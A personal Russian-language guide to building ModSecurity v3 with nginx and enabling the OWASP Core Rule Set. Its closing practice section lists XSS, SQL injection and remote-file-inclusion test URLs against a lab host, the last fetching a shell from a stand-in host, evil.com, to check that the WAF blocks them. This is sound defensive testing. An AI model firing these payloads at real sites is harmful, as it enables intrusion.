sudo apt update
sudo apt install -y git g++ make automake libtool pkg-config libpcre3-dev \
    libxml2 libxml2-dev libyajl-dev libcurl4-openssl-dev libgeoip-dev \
    liblmdb-dev libssl-dev libxml2-utils libpcre2-dev

1. Клонируем исходники ModSecurity v3 (libmodsecurity) и собираем
1.1 Клонируем
cd /usr/local/src
sudo git clone --depth 1 https://github.com/SpiderLabs/ModSecurity
cd ModSecurity
1.2 Иницализация
sudo git submodule init
sudo git submodule update
sudo ./build.sh
sudo ./configure
sudo make #обычно минут 15
sudo make install
=== Проверка всей этой каши, как результат нам нужно
libmodsecurity.so -> libmodsecurity.so.3.0.10
libmodsecurity.so.3 -> libmodsecurity.so.3.0.10
libmodsecurity.so.3.0.10 ====

ls -lh /usr/local/lib | grep modsecurity #пусто - плохо, идём дальше
sudo find / -name 'libmodsecurity*' 2>/dev/null
#Result
/usr/local/modsecurity/lib/libmodsecurity.so.3.0.14
/usr/local/modsecurity/lib/libmodsecurity.so.3
/usr/local/modsecurity/lib/libmodsecurity.so
/usr/local/modsecurity/lib/libmodsecurity.la
/usr/local/modsecurity/lib/libmodsecurity.a
Вот что ты видишь:
libmodsecurity.so — это твоя динамическая библиотека (WAF-движок)
libmodsecurity.a — статическая библиотека (не нужна для nginx-module, но полезно иметь)
.la, .so.3, .so.3.0.14 — это всё symlink’и и версии

ШАГ 3. Склонировать и собрать nginx модуль ModSecurity
cd /usr/local/src
sudo git clone --depth 1 https://github.com/SpiderLabs/ModSecurity-nginx.git
cd nginx-1.24.0
sudo ./configure --with-compat --add-dynamic-module=../ModSecurity-nginx
sudo make modules
ls -lh objs/ngx_http_modsecurity_module.so

ШАГ 4. Установить модуль и подключить его в nginx
#Проверяю директорию /usr/lib/nginx/modules/
cp objs/ngx_http_modsecurity_module.so /usr/lib/nginx/modules/
#добавь в nginx.conf
load_module modules/ngx_http_modsecurity_module.so;
nginx -t

ШАГ 5. Подготовить основной конфиг ModSecurity
--------------------------------------------------
modsecurity.conf-recommended — это пример (template) базовой конфигурации, который дают разработчики ModSecurity.
Он содержит все необходимые параметры по умолчанию:
— как работает движок,
— как вести логи,
— какие лимиты на обработку запросов,
— в каком режиме вести себя (только логировать или реально блокировать).
--------------------------------------------------
sudo mkdir -p /etc/nginx/modsec
sudo wget -O /etc/nginx/modsec/modsecurity.conf https://raw.githubusercontent.com/SpiderLabs/ModSecurity/v3/master/modsecurity.conf-recommended
sudo cp /etc/nginx/modsec/modsecurity.conf /etc/nginx/modsec/modsecurity.conf.bak
sudo nano /etc/nginx/modsec/modsecurity.conf
#Change 
SecRuleEngine DetectionOnly -> SecRuleEngine On
sudo wget -O /etc/nginx/modsec/unicode.mapping https://raw.githubusercontent.com/SpiderLabs/ModSecurity/v3/master/unicode.mapping


ШАГ 6. Подключить ModSecurity к nginx (включить WAF на нужных хостах)
### К примеру 
nano .../laravel.lab.local.conf
#add this
    location / {
        modsecurity on;
        modsecurity_rules_file /etc/nginx/modsec/modsecurity.conf;

nginx -t
systemctl restart nginx

ШАГ 7. Подключение OWASP Core Rule Set
cd /etc/nginx/modsec
sudo git clone --depth 1 https://github.com/coreruleset/coreruleset.git
sudo mv coreruleset owasp-crs
sudo nano /etc/nginx/modsec/modsecurity.conf
sudo cp /etc/nginx/modsec/owasp-crs/crs-setup.conf.example /etc/nginx/modsec/owasp-crs/crs-setup.conf
#add to the end
Include /etc/nginx/modsec/owasp-crs/crs-setup.conf
Include /etc/nginx/modsec/owasp-crs/rules/*.conf
nginx -t 
systemctl reload nginx
================================================
##### Немного практики, по будем хацкерами #####
================================================
---#Вводишь в браузер: 
1. XSS
https://laravel.lab.local/?test=<script>alert(1)</script>
Тест на XSS (Cross-Site Scripting).
В параметр URL подставляется скрипт: <script>alert(1)</script>.
Что пытается сделать атакующий:
Внедрить JS-код, чтобы он выполнился у жертвы (обычно с целью кражи cookies или захвата управления).
Как ModSecurity реагирует:
Правила OWASP CRS определяют такой инпут как потенциально опасный — запрос блокируется (403) и пишется в лог
2.SQLi
https://laravel.lab.local/?id=1'+or+'1'='1
Тест на SQL-инъекцию (SQL Injection).
Что пытается сделать атакующий:
Добавить в параметр запроса фрагмент, который может “сломать” SQL-запрос в backend, например:
' OR '1'='1 всегда возвращает true, что может дать несанкционированный доступ к данным.
Как ModSecurity реагирует:
Это классическая SQLi-атака — такие строки фильтруются по регуляркам в правилах, запрос блокируется и логируется
3.RFI
https://laravel.lab.local/?file=http://evil.com/shell.txt
Тест на удалённое включение файла (Remote File Inclusion).
Что пытается сделать атакующий:
Передать в параметр ссылку на внешний файл. Если backend не фильтрует это, злоумышленник может попытаться включить/выполнить чужой код.
Как ModSecurity реагирует:
Такие попытки тоже прописаны в правилах — если видит, что в параметре подозрительно полный URL на внешний ресурс, запрос блокируется.
================================================
##### Далее логи #####
================================================
cat /etc/nginx/modsec/modsecurity.conf | grep 'audit' # узнать путь логов modsecurity
#Result: SecAuditLog /var/log/modsec_audit.log
tail -n 20 /var/log/modsec_audit.log

!!!!!!------ Результат, оказывается нужно повышить ParanoiaLevel -----!!!!!!!
nano /etc/nginx/modsec/owasp-crs/crs-setup.conf
SecAction \
    "id:900000,\
    phase:1,\
    pass,\
    t:none,\
    nolog,\
    tag:'OWASP_CRS',\
    ver:'OWASP_CRS/4.17.0-dev',\
    setvar:tx.blocking_paranoia_level=2"
